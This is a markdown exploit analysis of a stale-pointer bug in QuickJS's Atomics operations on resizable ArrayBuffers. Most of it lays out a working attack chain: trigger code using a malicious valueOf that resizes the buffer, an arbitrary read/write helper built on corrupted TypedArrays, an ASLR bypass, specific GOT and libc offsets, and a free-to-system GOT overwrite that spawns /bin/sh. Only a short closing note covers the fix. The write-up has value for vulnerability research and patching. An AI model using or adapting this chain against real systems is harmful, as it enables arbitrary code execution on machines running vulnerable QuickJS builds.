# QuickJS Atomics Resizable ArrayBuffer Exploit Analysis

## Vulnerability Summary

The vulnerability exists in QuickJS's `js_atomics_op()` function in `quickjs.c`. When performing atomic operations on a TypedArray backed by a Resizable ArrayBuffer, the function captures a pointer to the underlying buffer's data BEFORE the `valueOf()` callback is invoked during argument coercion. If `valueOf()` resizes the buffer (potentially reallocating it), the captured pointer becomes stale, leading to a use-after-free/out-of-bounds write condition.

## Exploitation Primitive

The exploit achieves arbitrary read/write through the following steps:

### Step 1: Trigger OOB Write via Stale Pointer

```javascript
let bufferSize = 72;
let ab = new ArrayBuffer(bufferSize, { maxByteLength: bufferSize * 4 });
let view32 = new Int32Array(ab);

let malicious = {
    valueOf: function() {
        ab.resize(bufferSize * 4);  // Resize triggers reallocation
        oobView32 = new Uint32Array(backingBuf);  // Create view into adjacent buffer
        return 0x7FFFFFF0 - 16;  // Return value to corrupt count field
    }
};

Atomics.add(view32, 16, malicious);
```

The `Atomics.add` operation:
1. Captures pointer `ptr` to the ArrayBuffer's backing store
2. Calls `JS_ToInt32()` on the value argument, triggering `valueOf()`
3. `valueOf()` resizes the buffer, causing reallocation
4. The original `ptr` is now stale (points to freed memory)
5. The atomic add writes to the stale pointer, corrupting adjacent heap data

### Step 2: Corrupt TypedArray for Arbitrary R/W

The OOB write corrupts a victim TypedArray's internal structure:
- Overwrites the `count` field with a huge value (0x7FFFFFF0)
- This gives the corrupted TypedArray OOB read/write access to adjacent heap memory

By scanning the OOB region, we find another TypedArray (`targetView64`) and corrupt its data pointer to achieve arbitrary memory access:

```javascript
function read64(addr) {
    // Corrupt targetView64's data pointer to addr
    oobView32[targetJSObjIndex - 2] = Number(addrBig & 0xFFFFFFFFn);
    oobView32[targetJSObjIndex - 1] = Number((addrBig >> 32n) & 0xFFFFFFFFn);
    // Read from the corrupted view
    let val = targetView64[0];
    // Restore original pointer
    restorePtr();
    return val;
}
```

### Step 3: Bypass ASLR

The exploit bypasses ASLR by:
1. Finding PIE pointers in the OOB heap region
2. Searching backwards from the lowest pointer to find the ELF header (magic 0x7f454c46)
3. Reading `free@GOT` (PIE + 0x10b008) to get a libc address
4. Searching backwards from the libc pointer to find libc's ELF header

### Step 4: Code Execution via GOT Overwrite

Since the binary has a writable GOT:
1. Calculate `system()` address: `libc_base + 0x53110`
2. Overwrite `free@GOT` with `system()` address
3. Create ArrayBuffers containing "/bin/sh\0" at their start
4. Let garbage collection free these buffers
5. When `free()` is called on a "/bin/sh" buffer, `system("/bin/sh")` executes

## Key Offsets

- **free@GOT**: PIE + 0x10b008
- **system**: libc + 0x53110
- **libc ELF magic**: 0x464c457f (little-endian)

## Execution Flow

```
1. Trigger vulnerability → OOB write primitive
2. Corrupt TypedArray count → OOB R/W
3. Find PIE base from heap pointers
4. Read free@GOT → Leak libc address
5. Find libc base from leaked address
6. Overwrite free@GOT with system()
7. Free buffer containing "/bin/sh"
8. Shell spawned
```

## Mitigation Notes

The vulnerability is caused by not re-validating pointers after JavaScript callbacks that could modify memory. A fix would be to re-fetch the buffer pointer after any operation that could trigger user code execution (like `valueOf()`).
